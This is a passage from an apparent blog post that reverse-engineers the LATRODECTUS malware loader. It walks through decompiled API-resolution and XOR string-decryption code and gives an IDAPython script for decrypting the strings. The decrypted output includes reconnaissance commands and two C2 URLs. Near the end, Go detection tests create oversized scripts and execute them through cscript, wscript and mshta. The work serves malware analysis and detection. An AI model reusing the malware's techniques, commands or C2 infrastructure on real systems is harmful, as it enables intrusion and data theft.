NtFlushInstructionCache_0; v76 = \u0026amp;mw_addr_NtFlushInstructionCache; flushes the instruction cache for a process. this makes sure that changes to code are recognized by the CPU and executed correctly.\nRtlRandomEx_0 v77 = RtlRandomEx_0; v79 = \u0026amp;mw_addr_RtlRandomEx; generates a pseudorandom number. can be used to generate random values [obfuscation, encryption, non-deterministic behaviour].\nNtQuerySystemInformation_0 v80 = NtQuerySystemInformation_0; v82 = \u0026amp;mw_addr_NtQuerySystemInformation; gets system information like process lists, performance metrics, etc.\nLdrQueryProcessModuleInformation_0 v83 = LdrQueryProcessModuleInformation_0; v85 = \u0026amp;mw_addr_LdrQueryProcessModuleInformation; gets information about the modules [DLLs] loaded in a process.\nRtlInitUnicodeString_0 v86 = RtlInitUnicodeString_0; v88 = \u0026amp;mw_addr_RtlInitUnicodeString; initializaes a UNICODE_STRING structure, often used in many WinAPI calls. can be used to prepare strings [DLL names, file paths, etc.].\nNtWriteFile_0 v89 = NtWriteFile_0; v91 = \u0026amp;mw_addr_NtWriteFile; writes data to a file or I/O device. can be used to write logs, drop payloads, or modify files for persistence.\nNtReadFile_0 v92 = NtReadFile_0; v94 = \u0026amp;mw_addr_NtReadFile; reads data from file or I/O device.\nNtDelayExecution_0 v95 = NtDelayExecution_0; v97 = \u0026amp;mw_addr_NtDelayExecution; suspends execution of the current thread for a specified interval (delay). can be used to avoid sandbox analysis, or to sync with other events.\nNtOpenKey_0 v98 = NtOpenKey_0; v100 = \u0026amp;mw_addr_NtOpenKey; opens a handle to a registry key. can be used to write values to the registry.\nNtSetValueKey_0 v101 = NtSetValueKey_0; v103 = \u0026amp;mw_addr_NtSetValueKey; sets the value of a registry key.\nNtQueryValueKey_0 v104 = NtQueryValueKey_0; v106 = \u0026amp;mw_addr_NtQueryValueKey; queries the value of a registry key.\nRtlFormatCurrentUserKeyPath_0 v107 = RtlFormatCurrentUserKeyPath_0; v109 = \u0026amp;mw_addr_RtlFormatCurrentUserKeyPath; formats a string that represents the current user\u0026rsquo;s key path in the registry. can be used to dynamically construct paths to user-specific registry settings.\nNtQueryInformationFile_0 v110 = NtQueryInformationFile_0; v112 = \u0026amp;mw_addr_NtQueryInformationFile; gets information about a file. can be used to verify files to make sure they\u0026rsquo;re the right target.\nrenaming remaining functions the fourth function inside sub_180006298() [sub_180009328()] seems to be resolving the kernel32 and ntdll APIs as well.\nlet\u0026rsquo;s rename it to mw_resolve_kernel32_api().\nsimilarly, functions sub_18000A2D8() [resolves module handles], sub_180008EF0() [resolves more APIs and DLLs], and the return function sub_18000AAAC() [resolves the ole32 API] can be resolved to mw_resolve_module_handles, mw_resolve_misc_api, and mw_resolve_ole32 respectively!\nlet\u0026rsquo;s also rename sub_180006298() to mw_resolve_handle_apis().\n__int64 mw_resolve_handle_apis() { if ( (unsigned int)mw_resolve_kernel32_dll() \u0026amp;\u0026amp; (unsigned int)mw_resolve_ntdll_dll() \u0026amp;\u0026amp; (unsigned int)mw_resolve_ntapi() \u0026amp;\u0026amp; (unsigned int)mw_resolve_kernel32_api() \u0026amp;\u0026amp; (unsigned int)mw_resolve_module_handles() \u0026amp;\u0026amp; (unsigned int)mw_resolve_misc_api() ) { return mw_resolve_ole32; } else { return 0LL; } } API pivoting the function sub_180003868() now has a lot more information than before.\ni\u0026rsquo;m going to examine the statement at line 32:\nqword_180010480 = mw_addr_CreateMutexW(0LL, 0LL, v9); according to the MSDN, CreateMutexW creates/opens a named or unnamed mutext object. a \u0026ldquo;mutex object\u0026rdquo; is a synchronization object whose state is set to signaled when it is not owned by any thread, and nonsignaled when it is owned. basically, \u0026ldquo;mutex\u0026rdquo; is a \u0026ldquo;mutually exclusive\u0026rdquo; flag. it acts as a \u0026ldquo;gatekeeper\u0026rdquo; to a section of code, allowing one thread in and blocking access to all others.\nso, using the CreateMutexEx function specifies an access mask for the object in question. the syntax for this function should shed some light on how it\u0026rsquo;s being used.\nHANDLE CreateMutexW( [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes, [in] BOOL bInitialOwner, [in, optional] LPCWSTR lpName ); in the screenshot above, the multiple positions of v9 are curious.\nsub_18000ACC8((__int64)\u0026amp;unk_18000FA00, (__int64)v9); v8 = v9; qword_180010480 = mw_addr_CreateMutexW(0LL, 0LL, v9); it appears in three spots, not including its initialization in line 11 [char v9[72];]. so what\u0026rsquo;s going on?\nv9 is passed as an argument, along with unk_18000FA00, to the function sub_18000ACC8(). v9 is then transformed by this function, and passed as the third argument to CreateMutexW, meaning its going to be the name of the created mutex object. if v9 is some sort of string, and its being transformed to then be used as the name of a newly created mutex object, this means that v9 is being decrypted by the function sub_18000ACC8() and the argument unk_18000FA00 is some encrypted data.\nthe function definition is at the very top, and it goes like this:\n__int64 __fastcall sub_18000ACC8(__int64 a1, __int64 a2) following the above logic, a1 would be encrypted data and a2 would be decrypted data. let\u0026rsquo;s take a look at the code below the definition.\n__int64 __fastcall sub_18000ACC8(__int64 a1, __int64 a2) { char v3; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 v5; // [rsp+28h] [rbp-10h] int v6; // [rsp+2Ch] [rbp-Ch] __int64 v8; // [rsp+40h] [rbp+8h] sub_180008EE4(0); v6 = *(_DWORD *)a1; v5 = *(_WORD *)(a1 + 4) ^ *(_DWORD *)a1; v8 = a1 + 6; for ( i = 0; i \u0026lt; (int)v5; ++i ) { v3 = *(_BYTE *)(v8 + i); v6 = sub_180008EE4(v6); *(_BYTE *)(a2 + i) += v3 + 10; *(_BYTE *)(a2 + i) = v6 ^ v3; } return a2; } computer, enhance! let\u0026rsquo;s take a closer look at two of the lines.\n\u0026#34;[...]\u0026#34; v5 = *(_WORD *)(a1 + 4) ^ *(_DWORD *)a1; \u0026#34;[...]\u0026#34; *(_BYTE *)(a2 + i) = v6 ^ v3; \u0026#34;[...]\u0026#34; these lines contain something called a \u0026ldquo;bitwise XOR\u0026rdquo; operator (denoted by ^). XOR is a fundamental digital logic operation that outputs false [0] if both input bits are the same, and outputs true [1] otherwise. the truth table of a simple XOR gate is as follows:\nX Y X ^ Y 0 0 0 0 1 1 1 0 1 1 1 0 cryptography refresher: XOR ciphers some of you may remember XOR ciphers from second-year CS/ECE courses in university. it\u0026rsquo;s a basic, yet powerful, encryption algorithm that operates as follows:\nA ^ 0 = A A ^ A = 0 A ^ B = B ^ A (A ^ B) ^ C = A ^ (B ^ C) (B ^ A) ^ A = B ^ 0 = B using this logic, a string of text can be encrypted by applying ^ to every character using a given key.\ntake a plaintext message, M, and a secret key, K. performing M ^ K yields an encrypted message, E [M ^ K = E]. to decrypt E, you just have to XOR it with the same key, K [E ^ K = M]. this is really convenient because the same operation can be used to both encrypt and decrypt.\nthere are some caveats, though. if a fixed-length key, K, is shorter than the message, M, the cipher can be broken by a \u0026ldquo;frequency analysis\u0026rdquo; (certain letters + combinations appearing more than once).\nhowever, if the key K is as long as the message M, the only way to break the cipher is by trying every possible key. this brute-force attack quickly becomes unfeasibly expensive because a key of n-bits has 2^n possibilities.\nsharing a long key K securely is also a challenge. on top of that, repeatedly using a long key K for multiple messages will be subjected to a frequency-based attack.\na good way around this is to use a pseudo-random number generator [RNG] to generate an unpredictable and repeatable stream of keys. this way, only the initial seed (much shorter) for the generator needs to be shared, assuming both parties are using the same generator. each block of the message is then encrypted using subsequent keys from the generator.\nfrom a security perspective, a simple repeating XOR (i.e. using the same key for XOR operation throughout the dataset) is enough to hide information in case where no extra security is required.\nXOR ciphers in malware exploit developers use XOR ciphers to obfuscate their code and data, which makes reverse engineering more challenging.\nportions of malware code can be XOR-encrypted, and then decrypted on the fly when the malware runs. static analysis here would be difficult because the original instructions appear as \u0026ldquo;random\u0026rdquo; data.\nstring obfuscation is another effective tactic used by exploit devs, turning plaintext strings like APIs, URLs, file paths, and C2 server addresses into encrypted ones, so using a string extraction tool here won\u0026rsquo;t help.\nstring decryption let\u0026rsquo;s come back to the function above with this new perspective.\n__int64 __fastcall sub_18000ACC8(__int64 a1, __int64 a2) { char v3; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 v5; // [rsp+28h] [rbp-10h] int v6; // [rsp+2Ch] [rbp-Ch] __int64 v8; // [rsp+40h] [rbp+8h] sub_180008EE4(0); v6 = *(_DWORD *)a1; v5 = *(_WORD *)(a1 + 4) ^ *(_DWORD *)a1; v8 = a1 + 6; for ( i = 0; i \u0026lt; (int)v5; ++i ) { v3 = *(_BYTE *)(v8 + i); v6 = sub_180008EE4(v6); *(_BYTE *)(a2 + i) += v3 + 10; *(_BYTE *)(a2 + i) = v6 ^ v3; } return a2; } the function sub_18000ACC8() accepts two arguments: a1 (encrypted data) and a2 (decrypted string). let\u0026rsquo;s rename these arguments so we can get a better picture of what\u0026rsquo;s going on.\n__int64 __fastcall sub_18000ACC8(__int64 encrypted_string, __int64 decrypted_string) { char v3; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 v5; // [rsp+28h] [rbp-10h] int v6; // [rsp+2Ch] [rbp-Ch] __int64 v8; // [rsp+40h] [rbp+8h] sub_180008EE4(0); v6 = *(_DWORD *)encrypted_string; v5 = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; v8 = encrypted_string + 6; for ( i = 0; i \u0026lt; (int)v5; ++i ) { v3 = *(_BYTE *)(v8 + i); v6 = sub_180008EE4(v6); *(_BYTE *)(decrypted_string + i) += v3 + 10; *(_BYTE *)(decrypted_string + i) = v6 ^ v3; } return decrypted_string; } let\u0026rsquo;s examine the function sub_180008EE4().\n__int64 __fastcall sub_180008EE4(int a1) { return (unsigned int)(a1 + 1); } this function seems to just be incrementing a value that is passed to it, so i can rename it as increment_value().\n__int64 __fastcall sub_18000ACC8(__int64 encrypted_string, __int64 decrypted_string) { char v3; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 v5; // [rsp+28h] [rbp-10h] int v6; // [rsp+2Ch] [rbp-Ch] __int64 v8; // [rsp+40h] [rbp+8h] increment_value(0); v6 = *(_DWORD *)encrypted_string; v5 = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; v8 = encrypted_string + 6; for ( i = 0; i \u0026lt; (int)v5; ++i ) { v3 = *(_BYTE *)(v8 + i); v6 = increment_value(v6); *(_BYTE *)(decrypted_string + i) += v3 + 10; *(_BYTE *)(decrypted_string + i) = v6 ^ v3; } return decrypted_string; } okay, so we\u0026rsquo;re getting closer to figuring out how this cipher function works.\nlet\u0026rsquo;s take a look at the next line.\nv6 = *(_DWORD *)encrypted_string; this line takes the first 4 bytes of the memory address that\u0026rsquo;s pointed to by encrypted_string and interprets them as a 4B [32-bit] integer.\nbasically, the memory address of encrypted_string is cast to a pointer, to a 32-bit integer, and then * retrieves the actual 32-bit value [first 4 bytes] stored at that address. this retrieved value is then stored in the variable v6.\nthe value of v6 is set at the start, so it\u0026rsquo;s clearly important. it\u0026rsquo;s then passed to increment_value(v6) inside the loop, meaning it\u0026rsquo;s being updated or altered for each iteration.\nas mentioned earlier, the core of XOR ciphers involves XOR-ing each byte of the plaintext (or encrypted text) with a key. check out the following line, that shows an XOR operation between v6 and v3.\n*(_BYTE *)(decrypted_string + i) = v6 ^ v3; the XOR operation v6 ^ v3 produces the decrypted string, which implies that v6 is actually the XOR key. this is supported by the fact that v6 is modified within each iteration of the loop, meaning that the key is being dynamically adjusted as each byte of encrypted_string is processed. [note: this is a common operation in encryption schemes where a rolling or changing key is used for each byte!]\nwe now have another variable name, and it\u0026rsquo;s an important one! let\u0026rsquo;s rewrite the function again.\n__int64 __fastcall sub_18000ACC8(__int64 encrypted_string, __int64 decrypted_string) { char v3; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 v5; // [rsp+28h] [rbp-10h] int xor_key; // [rsp+2Ch] [rbp-Ch] __int64 v8; // [rsp+40h] [rbp+8h] increment_value(0); xor_key = *(_DWORD *)encrypted_string; v5 = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; v8 = encrypted_string + 6; for ( i = 0; i \u0026lt; (int)v5; ++i ) { v3 = *(_BYTE *)(v8 + i); xor_key = increment_value(xor_key); *(_BYTE *)(decrypted_string + i) += v3 + 10; *(_BYTE *)(decrypted_string + i) = xor_key ^ v3; } return decrypted_string; } the xor_key starts at the start of the encrypted_string.\nthe length of the decrypted string is then calculated. it appears to be calculated by XOR-ing the first byte of the encrypted data with the fifth byte.\nv5 = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; if you recall that the encrypted data appeared as the argument unk_18000FA00:\nsub_18000ACC8((__int64)\u0026amp;unk_18000FA00, (__int64)v9); examining the memory contents of unk_18000FA00 show that the first byte is 20h and the fifth byte is 30h, so 20h ^ 30h gives the length of the decrypted data. the calculation is simple, and can be performed using the python CLI.\n0x20 ^ 0x30 16 in this specific case, the length of the decrypted string is 16. let\u0026rsquo;s rename the variables to make it more readable.\ndecrypted_string_len = *(_WORD *)(encrypted_string + 4) ^ (*_DWORD *)encrypted_string; v5 also appears at the start of the loop, and it represents the upper limit of the loop (i.e. the loop runs v5 times). from this, we can deduce that v5 represents the number of iterations needed to process the entire encrypted_string.\nso: the loop iterates v5 times, processes v5 bytes from encrypted_string, and writes v5 bytes to decrypted_string. v5 then must represent the number of bytes that the entire function needs to process, and this number of bytes corresponds to the length of decrypted_string.\nbut why the XOR?\nv5 = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; this might be a way for the function to either obfuscate or verify the length of the data. for example, maybe the length of the encrypted data could be stored in encrypted_string in an obfuscated way to prevent easy detection by reversing simple length indicators? i\u0026rsquo;m not sure.\narmed with another variable name, we\u0026rsquo;re closer to deciphering the function.\n__int64 __fastcall sub_18000ACC8(__int64 encrypted_string, __int64 decrypted_string) { char v3; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 decrypted_string_length; // [rsp+28h] [rbp-10h] int xor_key; // [rsp+2Ch] [rbp-Ch] __int64 v8; // [rsp+40h] [rbp+8h] increment_value(0); xor_key = *(_DWORD *)encrypted_string; decrypted_string_length = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; v8 = encrypted_string + 6; for ( i = 0; i \u0026lt; (int)decrypted_string_length; ++i ) { v3 = *(_BYTE *)(v8 + i); xor_key = increment_value(xor_key); *(_BYTE *)(decrypted_string + i) += v3 + 10; *(_BYTE *)(decrypted_string + i) = xor_key ^ v3; } return decrypted_string; } next, let\u0026rsquo;s take a look at the first appearance of v8.\nv8 = encrypted_string + 6; v8 is set to point to the memory address that is 6 bytes beyond the start of encrypted_string. i would suppose that the first 6 bytes of encrypted_string are used for storing metadata, like the XOR key and length, and so v8 is supposed to point to the actual data that needs to be decrypted.\nv8 also appears in the loop.\nv3 = *(_BYTE *)(v8 + i); could v8 be the base address for accessing the encrypted data within the loop? the line looks like it accesses a byte of the encrypted data by adding the loop index i to v8, meaning v8 marks the start point of the encrypted portion of encrypted_string.\n__int64 __fastcall sub_18000ACC8(__int64 encrypted_string, __int64 decrypted_string) { char v3; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 decrypted_string_length; // [rsp+28h] [rbp-10h] int xor_key; // [rsp+2Ch] [rbp-Ch] __int64 start_index_encrypted_string; // [rsp+40h] [rbp+8h] increment_value(0); xor_key = *(_DWORD *)encrypted_string; decrypted_string_length = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; start_index_encrypted_string = encrypted_string + 6; for ( i = 0; i \u0026lt; (int)decrypted_string_length; ++i ) { v3 = *(_BYTE *)(start_index_encrypted_string + i); xor_key = increment_value(xor_key); *(_BYTE *)(decrypted_string + i) += v3 + 10; *(_BYTE *)(decrypted_string + i) = xor_key ^ v3; } return decrypted_string; } all that\u0026rsquo;s left is v3. it first appears inside the loop.\nv3 = *(_BYTE *)(start_index_encrypted_string + i); v3 is assigned the value of the byte located at start_index_encrypted_string + i (the current byte being processed inside the loop). this byte is retrieved from encrypted_string, starting from the address pointed to by start_index_encrypted_string and advancing by i with each iteration.\njumping slightly ahead, v3 is the byte that gets XOR\u0026rsquo;d with xor_key to produce the decrypted byte.\n*(_BYTE *)(decrypted_string + i) = xor_key ^ v3; through this, we can infer that v3 is the encrypted byte being processed in the current loop iteration.\n__int64 __fastcall sub_18000ACC8(__int64 encrypted_string, __int64 decrypted_string) { char current_encrypted_byte; // [rsp+20h] [rbp-18h] unsigned __int16 i; // [rsp+24h] [rbp-14h] unsigned __int16 decrypted_string_length; // [rsp+28h] [rbp-10h] int xor_key; // [rsp+2Ch] [rbp-Ch] __int64 start_index_encrypted_string; // [rsp+40h] [rbp+8h] increment_value(0); xor_key = *(_DWORD *)encrypted_string; decrypted_string_length = *(_WORD *)(encrypted_string + 4) ^ *(_DWORD *)encrypted_string; start_index_encrypted_string = encrypted_string + 6; for ( i = 0; i \u0026lt; (int)decrypted_string_length; ++i ) { current_encrypted_byte = *(_BYTE *)(start_index_encrypted_string + i); xor_key = increment_value(xor_key); *(_BYTE *)(decrypted_string + i) += current_encrypted_byte + 10; *(_BYTE *)(decrypted_string + i) = xor_key ^ current_encrypted_byte; } return decrypted_string; } the function is now deciphered! it appears to be decrypting an encrypted string, using a combination of XOR encryption and additional arithmetic manipulation. it processes each byte of the encrypted_string, performs operations on it, then writes the result to decrypted_string.\nhere\u0026rsquo;s a more detailed flow summary, for the curious.\nxor_key extracted from first 4 bytes of encrypted_string, and serves as the initial XOR key.\ndecrypted_string_length is calculated by XOR-ing a 2-byte value starting at the 5th byte of encrypted_string with the xor_key. this value is the length of the decrypted_string to be processed.\nstart_index_encrypted_string points to the start of the actual encrypted data within encrypted_string, skipping the first 6 bytes.\nthe function then enters a loop that runs decrypted_string_length times, processing each byte of the encrypted data.\ncurrent_encrypted_byte is set to the byte at the current index i within the encrypted data. xor_key is updated using increment_value (altering the key for the next iteration). the byte at the current index of decrypted_string is first incremented by the value of current_encrypted_byte + 10. finally, the adjusted byte is XOR\u0026rsquo;d with the updated xor_key, completing the decryption for the byte. this result is stored in decrypted_string at the corresponding index.\nautomating the decryption now that we know how the decryption/encryption works, automating the process to decrypt all the strings encrypted by the malware should be straightforward.\ni\u0026rsquo;ve included comments in the code below so you can get a better understanding of the thought process behind it.\nimport idaapi, idc, idautils # find all cross-refs to given func address def find_fn_Xrefs(fn_addr): xref_list = [] # iterate thru all refs to the func for ref in idautils.XrefsTo(fn_addr): xref = {} xref[\u0026#39;normal\u0026#39;] = ref.frm # normal address of the reference xref[\u0026#39;hex\u0026#39;] = hex(ref.frm) # hex address of the reference xref_list.append(xref) # append reference to list return xref_list # get specific number of bytes from memory address def get_bytes_from_address(addr, length): ea = addr ret_data = bytearray() # read specified number of bytes from address for i in range(0, length): data = idc.get_bytes(ea + i, 1) # get one byte at a time ret_data.append(data[0]) # append byte to bytearray i += 1 return ret_data # retrieve nth argument passed to function using fastcall def get_fastcall_args_number(fn_addr, arg_number): args = [] arg_count = 0 ptr_addr = fn_addr # walk back thru instructions to find args while True: ptr_addr = idc.prev_head(ptr_addr) # get previous instruction # check for \u0026#39;mov\u0026#39; or \u0026#39;lea\u0026#39; instructions [typically set up args] if idc.print_insn_mnem(ptr_addr) == \u0026#39;mov\u0026#39; or idc.print_insn_mnem(ptr_addr) == \u0026#39;lea\u0026#39;: arg_count += 1 if arg_count == arg_number: # if desired arg number is reached # determine types of operand and retrieve the value if idc.get_operand_type(ptr_addr, 1) == idc.o_mem: args.append(idc.get_operand_value(ptr_addr, 1)) elif idc.get_operand_type(ptr_addr, 1) == idc.o_imm: args.append(idc.get_operand_value(ptr_addr, 1)) elif idc.get_operand_type(ptr_addr, 1) == idc.o_reg: reg_name = idaapi.get_reg_name(idc.get_operand_value(ptr_addr, 1), 4) reg_value = get_reg_value(ptr_addr, reg_name) args.append(reg_value) else: # handle cases where operand type not recognized print(\u0026#34;exception in get_stack_args\u0026#34;) return return args else: continue return args # decode string from bytes (utf-8 and utf-16 encoding) def decode_str(s) -\u0026gt; str: is_wide_str = len(s) \u0026gt; 1 and s[1] == 0 # check if wide string (utf-16) result_str = \u0026#34;\u0026#34; # decode based on encoding if not is_wide_str: result_str = s.decode(\u0026#34;utf8\u0026#34;) else: result_str = s.decode(\u0026#34;utf-16le\u0026#34;) # return if result valid ASCII string if result_str.isascii(): return result_str return \u0026#34;\u0026#34; # perform decryption on encrypted string using malware logic def decrypt(a1): result = bytearray() # hold decrypted string in bytearray key = a1[0] # init key with first byte of encrypted string result_len = a1[4] ^ a1[0] # calculate length of decrypted string (using XOR) v8 = 6 # offset to start of encrypted data within array extracted_data = a1[6:6 + result_len] # extract encrypted data (bytes) # loop thru encrypted data + decrypt each byte for i in range(result_len): key = key + 1 # increment key print(f\u0026#34;debug: key: {hex(key)}, extracted_data[i] : {hex(extracted_data[i])}, result: {extracted_data[i] ^ key}\u0026#34;) result.append(extracted_data[i] ^ key) # XOR each byte with updated key print(f\u0026#34;debug: {len(result)} | {result}\u0026#34;) return decode_str(result) # decode + return resulting string # set comments in hex-rays decompiler view @ specific address def set_hexrays_comment(address, text): print(\u0026#34;setting hex rays comment\u0026#34;) cfunc = idaapi.decompile(address) # decompile func @ given address tl = idaapi.treeloc_t() tl.ea = address tl.itp = idaapi.ITP_SEMI # set comment if decompilation was successful if cfunc: cfunc.set_user_cmt(tl, text) cfunc.save_user_cmts() else: print(\u0026#34;decompile failed: {:#x}\u0026#34;.format(address)) # set comment in disassembly + decompiler view def set_comment(address, text): idc.set_cmt(address, text, 0) # set comment in disassembly view set_hexrays_comment(address, text) # set comment in decompiler view # main block below # set address of decryption function decryption_fn_address = 0x000000018000ACC8 # get cross-refs to decryption func xref_list = find_fn_Xrefs(decryption_fn_address) # iterate over each reference for ref in xref_list: print(\u0026#34;\u0026#34;) print(f\u0026#34;func address : {ref[\u0026#39;hex\u0026#39;]}, {ref[\u0026#39;normal\u0026#39;]}\u0026#34;) # retrieve first arg passed to decryption func (address of encrypted_string) arg_address_hex = hex(get_fastcall_args_number(ref[\u0026#39;normal\u0026#39;], 1)[0]) arg_address = get_fastcall_args_number(ref[\u0026#39;normal\u0026#39;], 1)[0] # read first 6 bytes from arg address to calculate length of decrypted string enc_value = get_bytes_from_address(arg_address, 8) print(f\u0026#34;debug: enc_value[0] : {hex(enc_value[0])}, enc_value[4]: {hex(enc_value[4])}\u0026#34;) result_str_len = enc_value[0] ^ enc_value[4] # calculate decrypted string length print(f\u0026#34;result char count : {result_str_len}\u0026#34;) # read bytes to decrypt full string enc_value = get_bytes_from_address(arg_address, 6 + result_str_len) # proceed with decryption only if string doesn\u0026#39;t contain invalid bytes if b\u0026#39;\\xff\\xff\\xff\\xff\u0026#39; not in enc_value: print(f\u0026#34;debug: len : {len(enc_value)}, enc_value: {enc_value}\u0026#34;) dec_string = decrypt(enc_value) # decrypt string print(f\u0026#34;decrypted string: {dec_string}\u0026#34;) set_comment(ref[\u0026#39;normal\u0026#39;], dec_string) # decrypted string as comment in IDA here are some of the strings that were decrypted.\ncross-references [xrefs] to the string_decryption function reveal instances where each call is associated with different strings, like pid, %d, proc, subproc, etc. these are probably used for for command execution or process management within the malware.\nadditional calls to string_decryption show CLI commands like ipconfig /all, systeminfo, net view /all. these are used to gather system + network information [i.e. reconnaissance].\nmore decrypted strings relating to HTTP requests, like Mozilla/4.0, Content-Type: application/x-www-form-urlencoded, and methods like POST and GET. this suggests the malware is communicating with its C2 server.\nmore decrypted strings. URLs like https://scifimond.com/live/ and https://drifajizo.fun/live/ show up, which are probably part of the infrastructure used for C2 communication + delivery.\ndecrypted strings show file paths + registry keys, like C:\\WINDOWS\\SYSTEM32\\rundll32.exe and \\update_data.dat. this suggests that the malware copies itself to a temporary location, exits the original location, and executes from the temporary location.\ndetecting the tactics + techniques used by LATRODECTUS this malware is a sophisticated loader, designed to deliver further payloads to compromised targets. it uses a multi-stage infection process that begins with a phishing email containing a link to a JavaScript dropper. the dropper connects to the C2 server to download a .msi file, which loads a packed DLL when executed. the unpacked DLL then performs activities like resolving critical APIs dynamically, decrypting encrypted strings, and executing commands for recon and persistence.\nrecap: dynamic API resolution + string decryption when analyzing the decompilation, i identified several dynamic API resolutions where the hashes were used to resolve addresses of critical Windows Native APIs.\nthese APIs [NtAllocateVirtualMemory, NtCreateThread, VirtualProtect, etc.] and their resolution allows LATRODECTUS to perform memory allocation, thread creation, and memory protection changes.\nLATRODECTUS also used a custom string decryption routine, that can decrypt various strings that are initially stored in an encrypted format within the binary. the decrypted strings include CLI arguments, URLs, registry paths, and more.\neach major tactic + technique used by malware like LATRODECTUS is well-documented enough to correspond to a MITRE ATT\u0026amp;CK rule. i wrote some more tests in Go (like the ones in the previous post) to extend the detection capabilities.\noversized windows script execution LATRODECTUS is known to be delivered via oversized JavaScript files, usually larger than 800KB, to bypass malware sandbox file upload size limits. the below script simulates creation + execution of large scripts in various formats [js, vbs, hta, etc.].\nfunc test() { fileTypes := []string{\u0026#34;js\u0026#34;, \u0026#34;jse\u0026#34;, \u0026#34;vbs\u0026#34;, \u0026#34;vbe\u0026#34;, \u0026#34;wsh\u0026#34;, \u0026#34;hta\u0026#34;} for _, fileType := range fileTypes { scriptPath := fmt.Sprintf(\u0026#34;C:\\\\Temp\\\\script.%s\u0026#34;, fileType) scriptContent := strings.Repeat(\u0026#34;A\u0026#34;, 30000001) // 30MB + 1 file, err := os.Create(scriptPath) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to create script file (%s): %v\u0026#34;. fileType, err)) Endpoint.Stop(1) // ERROR } defer file.Close() _, err = file.WriteString(scriptContent) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to write to script file (%s): %v\u0026#34;, fileType, err)) } // execute script using `cscript.exe`, `wscript.exe`, `mshta.exe` executeCommand(fmt.Sprintf(\u0026#34;cscript.exe %s\u0026#34;, scriptPath)) executeCommand(fmt.Sprintf(\u0026#34;wscript.exe %s\u0026#34;, scriptPath)) executeCommand(fmt.Sprintf(\u0026#34;mshta.exe %s\u0026#34;, scriptPath)) } Endpoint.Stop(101) // UNPROTECTED // execute command function func executeCommand(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;command execution not available\u0026#34;) Endpoint.Stop(126) // PROTECTED } out, err := exec.Command(\u0026#34;cmd.exe\u0026#34;, \u0026#34;/C\u0026#34;, command).CombinedOutput() if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to execute command: %s\u0026#34;, string(out))) Endpoint.Stop(1) // ERROR } Endpoint.Say(fmt.Sprintf(\u0026#34;successfully executed command %s\u0026#34;, command)) if strings.Contains(string(out), \u0026#34;Access Denied\u0026#34;) { Endpoint.Say(\u0026#34;process execution blocked\u0026#34;) Endpoint.Stop(126) } } } func cleanup { // remove files fileTypes := []string{\u0026#34;js\u0026#34;, \u0026#34;jse\u0026#34;, \u0026#34;vbs\u0026#34;, \u0026#34;vbe\u0026#34;, \u0026#34;wsh\u0026#34;, \u0026#34;hta\u0026#34;} for _, fileType := range fileType { scriptPath := fmt.Sprintf(\u0026#34;C:\\\\Temp\\\\script.%s\u0026#34;, fileType) err := os.Remove(scriptPath) if err != nil { Endpoint.Say(fmt.Sprintf(\u0026#34;failed to remove script file %s: %v\u0026#34;, fileType, err)) } } Endpoint.Say(\u0026#34;cleanup completed!\u0026#34;) Endpoint.Stop(100) // PROTECTED } the script detects the presence of unusually large script files being created + executed.\nexecution via suspicious WMI client LATRODECTUS uses WMI to execute processes in a suspicious manner, using parent processes like mshta.exe, excel.exe, and others.\nfunc test() { effectiveParents := []string{\u0026#34;excel.exe\u0026#34;, \u0026#34;powerpnt.exe\u0026#34;, \u0026#34;winword.exe\u0026#34;, \u0026#34;mshta.exe\u0026#34;, \u0026#34;wscript.exe\u0026#34;, \u0026#34;wmic.exe\u0026#34;, \u0026#34;rundll32.exe\u0026#34;, \u0026#34;regsvr.exe\u0026#34;, \u0026#34;msbuild.exe\u0026#34;, \u0026#34;InstallUtil.exe\u0026#34;} parentPaths := []string{\u0026#34;C:\\\\Users\\\\Public\\\\*\u0026#34;, \u0026#34;C:\\\\ProgramData\\\\*\u0026#34;, \u0026#34;C:\\\\Users\\\\*\\\\AppData\\\\*\u0026#34;, \u0026#34;C:\\\\Windows\\\\Microsoft.NET\\\\*\u0026#34;} hashExclusions := []string{ \u0026#34;0e692d9d3342fdcab1ce3d61aed0520989a94371e5898edb266c92f1fe11c97f\u0026#34;, \u0026#34;8ee339af3ce1287066881147557dc3b57d1835cbba56b2457663068ed25b7840\u0026#34;, \u0026#34;f27cb78f44fc8f70606be883bbed705bd1dd2c2f8a84a596e5f4924e19068f22\u0026#34;, } executableExclusions := []string{ \u0026#34;C:\\\\Windows\\\\System32\\\\WerFault.exe\u0026#34;, \u0026#34;C:\\\\Windows\\\\SysWOW64\\\\WerFault.exe\u0026#34;, \u0026#34;C:\\\\Windows\\\\System32\\\\typeperf.exe\u0026#34;, \u0026#34;C:\\\\Program Files\\\\Adobe\\\\Acrobat DC\\\\Acrobat\\\\AcroTray.exe\u0026#34;, \u0026#34;C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\u0026#34;, \u0026#34;C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\u0026#34;, } executeCommand := func(command string) { if !Endpoint.IsAvailable(\u0026#34;cmd.exe\u0026#34;) { Endpoint.Say(\u0026#34;[+] command execution not available\u0026#34;) 